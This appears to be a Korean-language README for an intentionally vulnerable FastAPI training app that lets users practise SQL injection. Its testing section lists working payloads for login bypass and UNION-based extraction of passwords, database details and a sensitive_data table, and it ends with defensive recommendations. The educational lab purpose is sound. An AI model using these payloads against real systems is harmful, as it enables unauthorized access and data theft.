# FastAPI SQL Injection 실험 프로젝트

⚠️ **경고: 이 프로젝트는 교육 목적으로만 사용하세요. 실제 운영 환경에서는 절대 사용하지 마세요.**

## 프로젝트 설명

이 프로젝트는 SQL Injection 취약점을 실험해볼 수 있는 간단한 FastAPI 웹 애플리케이션입니다.

## 실행 방법

### 1. Docker Compose로 실행

```bash
docker-compose up --build
```

### 2. 웹 브라우저에서 접속

http://localhost:8000

## 테스트 방법

### 정상 로그인 테스트
- 사용자명: `admin`, 비밀번호: `password`
- 사용자명: `user1`, 비밀번호: `secret`

### SQL Injection 테스트

#### 1. 인증 우회
- 사용자명: `admin'#`
- 비밀번호: 아무거나

#### 2. 모든 사용자 조회
- 사용자명: `' OR 1=1#`
- 비밀번호: 아무거나

#### 3. UNION 기반 공격 (로그인)
- 사용자명: `' UNION SELECT username, password, email, 1, 2 FROM users#`

#### 4. 데이터베이스 정보 획득 (로그인)
- 사용자명: `' UNION SELECT version(), database(), user(), 1, 2#`

### 검색 기능 SQL Injection

검색창에서:
- `' UNION SELECT secret_info, 'leaked' FROM sensitive_data --`

## API 엔드포인트

- `GET /` - 메인 페이지 (로그인 폼)
- `POST /login` - 취약한 로그인 (SQL Injection 가능)
- `POST /search` - 취약한 사용자 검색
- `GET /users` - 모든 사용자 조회 (안전한 엔드포인트)

## 데이터베이스 구조

### users 테이블
- id (INT, PRIMARY KEY)
- username (VARCHAR)
- password (VARCHAR)
- email (VARCHAR)
- created_at (TIMESTAMP)

### sensitive_data 테이블
- id (INT, PRIMARY KEY)
- user_id (INT, FOREIGN KEY)
- secret_info (VARCHAR)

## 학습 목표

1. SQL Injection 취약점이 어떻게 발생하는지 이해
2. 다양한 SQL Injection 공격 기법 실습
3. 안전한 코딩 방법의 중요성 인식

## 보안 권장사항

실제 애플리케이션에서는:
1. Prepared Statements 사용
2. 입력값 검증 및 이스케이프
3. 최소 권한 원칙 적용
4. WAF (Web Application Firewall) 사용